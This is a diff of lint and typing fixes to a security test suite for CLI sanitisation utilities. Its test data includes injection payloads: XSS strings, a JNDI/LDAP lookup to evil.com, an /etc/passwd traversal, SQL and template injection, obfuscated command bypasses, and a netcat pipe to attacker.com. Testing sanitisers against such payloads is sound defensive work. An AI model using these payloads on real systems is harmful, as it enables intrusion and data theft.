@@ -138,7 +138,7 @@ describe('CRITICAL SECURITY: CLI Security Utilities', () => {
           const decoded = decodeURIComponent(
             cmd.replace(/&#\d+;/g, match => {
               const num = match.slice(2, -1);
-              return String.fromCharCode(parseInt(num));
+              return String.fromCharCode(parseInt(num, 10));
             })
           );
 
@@ -262,7 +262,8 @@ describe('CRITICAL SECURITY: CLI Security Utilities', () => {
       test('should remove dangerous characters', () => {
         const dangerousInputs = [
           '<script>alert("xss")</script>',
-          '${jndi:ldap://evil.com/exploit}',
+          // eslint-disable-next-line no-template-curly-in-string
+          '\\${jndi:ldap://evil.com/exploit}',
           '../../../etc/passwd',
           'DROP TABLE users;',
           '{{7*7}}', // Template injection
@@ -412,9 +413,12 @@ describe('CRITICAL SECURITY: CLI Security Utilities', () => {
         mockSecurityUtils.escapeShellCharacters.mockImplementation(input => {
           if (!input) return input;
           // Remove control characters and escape shell chars
-          return input
-            .replace(/[\x00-\x1f\x7f-\x9f]/g, '') // Remove control chars
-            .replace(/([|&;()<>\s*?[\]{}$`\\"'])/g, '\\$1');
+          return (
+            input
+              // eslint-disable-next-line no-control-regex
+              .replace(/[\x00-\x1f\x7f-\x9f]/g, '') // Remove control chars
+              .replace(/([|&;()<>\s*?[\]{}$`\\"'])/g, '\\$1')
+          );
         });
 
         edgeCases.forEach(input => {
@@ -646,6 +650,7 @@ describe('CRITICAL SECURITY: CLI Security Utilities', () => {
       const bypassAttempts = [
         'l\\s -la', // Character escaping
         'ec\x68o hello', // Hex encoding
+        // eslint-disable-next-line no-useless-concat
         'e' + 'cho hello', // String concatenation
         'eval("echo")', // Code evaluation
         '\u0065cho hello', // Unicode encoding
@@ -758,6 +763,7 @@ export const SecurityTestHelpers = {
 
     // XSS payloads
     '<script>alert("xss")</script>',
+    // eslint-disable-next-line no-script-url
     'javascript:alert("xss")',
     '<img src=x onerror=alert("xss")>',
 
@@ -767,11 +773,14 @@ export const SecurityTestHelpers = {
 
     // Template injection
     '{{7*7}}',
+    // eslint-disable-next-line no-template-curly-in-string
     '${7*7}',
+    // eslint-disable-next-line no-template-curly-in-string
     '<%= 7*7 %>',
 
     // LDAP injection
-    '${jndi:ldap://evil.com/exploit}',
+    // eslint-disable-next-line no-template-curly-in-string, no-useless-escape
+    '\\${jndi:ldap://evil.com/exploit}',
 
     // OS command injection
     '| nc attacker.com 4444',
@@ -781,7 +790,10 @@ export const SecurityTestHelpers = {
   /**
    * Test security utility with comprehensive payload set
    */
-  testSecurityFunction: (securityFn: Function, shouldBlock: boolean = true) => {
+  testSecurityFunction: (
+    securityFn: (...args: unknown[]) => unknown,
+    shouldBlock: boolean = true
+  ) => {
     const payloads = SecurityTestHelpers.generateInjectionPayloads();
 
     payloads.forEach(payload => {
@@ -796,7 +808,10 @@ export const SecurityTestHelpers = {
   /**
    * Benchmark security function performance
    */
-  benchmarkSecurityFunction: async (securityFn: Function, iterations: number = 1000) => {
+  benchmarkSecurityFunction: async (
+    securityFn: (...args: unknown[]) => unknown,
+    iterations: number = 1000
+  ) => {
     const testInput = 'normal safe input';
     const startTime = Date.now();
 
